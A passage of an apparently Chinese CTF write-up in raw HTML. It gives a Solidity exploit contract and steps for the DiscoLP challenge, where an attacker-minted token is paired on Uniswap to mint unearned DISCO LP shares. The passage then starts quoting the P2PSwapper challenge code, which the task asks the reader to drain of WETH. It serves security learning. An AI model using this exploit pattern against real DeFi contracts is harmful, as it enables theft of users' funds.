class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Analyze-1\"><a href=\"#Analyze-1\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h3><p>关于什么是流动性挖矿可以参考如下链接，讲的很形象：<a href=\"https://www.zhihu.com/question/449221683\">https://www.zhihu.com/question/449221683</a></p>\n<p>题目就是通过流动性挖矿产生disco token的收益，了解了流动性挖矿之后，就是要创建交易对也就是合约中的pair，从而获得disco，而我们只有1jimbo和1jambo想要获得100+的disco显然是不够的，但是创建你的交易对并没有限制token，所以可以自己发一个token再与tokena进行交易对创建，调用depositToken获取得到超过100流动性的DISCO，再把获取的流动性token由攻击者合约转给player即可。</p>\n<h3 id=\"Attack-1\"><a href=\"#Attack-1\" class=\"headerlink\" title=\"Attack\"></a>Attack</h3><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IUniswapV2Factory</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">event</span> <span class=\"token function\">PairCreated</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> token0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> token1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> pair<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">getPair</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> tokenB<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">allPairs</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">allPairsLength</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">feeTo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">feeToSetter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">createPair</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> tokenB<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IUniswapV2Router</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">WETH</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">addLiquidity</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _tokenA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _tokenB<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountADesired<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountBDesired<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountAMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountBMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _deadline<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountB<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _liquidity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">removeLiquidity</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _tokenA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _tokenB<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _liquidity<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountAMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountBMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _deadline<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">swapExactTokensForTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountIn<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amountOutMin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> _path<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _deadline<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> _amounts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">swapETHForExactTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountOut<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> _path<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _deadline<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> _amounts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">getAmountOut</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountIn<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _reserveIn<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _reserveOut<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amountOut<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Pair</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">token0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">token1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">price0CumulativeLast</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _price0CumulativeLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">price1CumulativeLast</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _price1CumulativeLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">getReserves</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint112</span> _reserve0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint112</span> _reserve1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint32</span> _blockTimestampLast<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _liquidity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">sync</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">DiscoLP</span> <span class=\"token keyword\">is</span> IERC20 <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">depositToken</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _minShares<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">calcCostFromShares</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _shares<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">totalReserve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">$</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token builtin\">address</span> <span class=\"token keyword\">constant</span> UniswapV2_FACTORY <span class=\"token operator\">=</span> <span class=\"token number\">0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ropsten</span>\n\t<span class=\"token builtin\">address</span> <span class=\"token keyword\">constant</span> UniswapV2_ROUTER02 <span class=\"token operator\">=</span> <span class=\"token number\">0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ropsten</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Token</span> <span class=\"token keyword\">is</span> ERC20 <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _name<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _symbol<span class=\"token punctuation\">)</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span>_name<span class=\"token punctuation\">,</span> _symbol<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">256</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> balance<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> attack <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> instance<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> tokenA<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> _factory <span class=\"token operator\">=</span> $<span class=\"token punctuation\">.</span>UniswapV2_FACTORY<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">address</span> _router <span class=\"token operator\">=</span> $<span class=\"token punctuation\">.</span>UniswapV2_ROUTER02<span class=\"token punctuation\">;</span>\n        Token evil <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Token</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Evil Token\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"EVIL\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        evil<span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">256</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        evil<span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>_router<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">256</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>_router<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">256</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">address</span> pair <span class=\"token operator\">=</span> <span class=\"token function\">IUniswapV2Factory</span><span class=\"token punctuation\">(</span>_factory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">createPair</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>evil<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>tokenA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amountA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amountB<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _shares<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">IUniswapV2Router</span><span class=\"token punctuation\">(</span>_router<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">addLiquidity</span><span class=\"token punctuation\">(</span>\n          <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>evil<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n          <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>tokenA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n          <span class=\"token number\">100000000000</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">**</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span>\n          <span class=\"token number\">1</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">**</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span>\n          <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">256</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">DiscoLP</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">depositToken</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>evil<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balance <span class=\"token operator\">=</span> <span class=\"token function\">DiscoLP</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token function\">DiscoLP</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">/**\n * step 1: get reserveToken() on instance\n * step 2: get token0 on Pair(reserveToken)\n * step 3: deploy attack contract\n * step 4: token0.transfer(attack contract, 1 * 10 ** 18)\n * step 5: attack(instance, 1000000000000 * 10 ** 18, token0)\n * step 6：transfer disco token to player \n */</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>攻击步骤如上所写</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202205010035728.png\"></p>\n<h2 id=\"3-P2PSwapper\"><a href=\"#3-P2PSwapper\" class=\"headerlink\" title=\"3.P2PSwapper\"></a>3.P2PSwapper</h2><h3 id=\"Request-2\"><a href=\"#Request-2\" class=\"headerlink\" title=\"Request\"></a>Request</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>P2PSwapper is a super convenient zero-trust P2P DEX for any assets! The fee is flat so the whales are welcome! Also, we have a referral program, and all the fees are equally distributed between us and the lead owners.</p></blockquote>\n<p>We’ve created a sample trade and deposited some money for it. We wanna make sure you cannot withdraw the fees assigned for our trade.</p>\n<p>You have to drain all the WETH tokens from the P2PSwapper’s balance.</p>\n<h3 id=\"Code-2\"><a href=\"#Code-2\" class=\"headerlink\" title=\"Code\"></a>Code</h3><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false</span>\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">TransferHelper</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">safeApprove</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> token<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// bytes4(keccak256(bytes('approve(address,uint256)')));</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSelector</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x095ea7b3</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            success <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'TransferHelper::safeApprove: approve failed'</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">safeTransfer</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> token<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// bytes4(keccak256(bytes('transfer(address,uint256)')));</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSelector</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xa9059cbb</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            success <span class=\"token 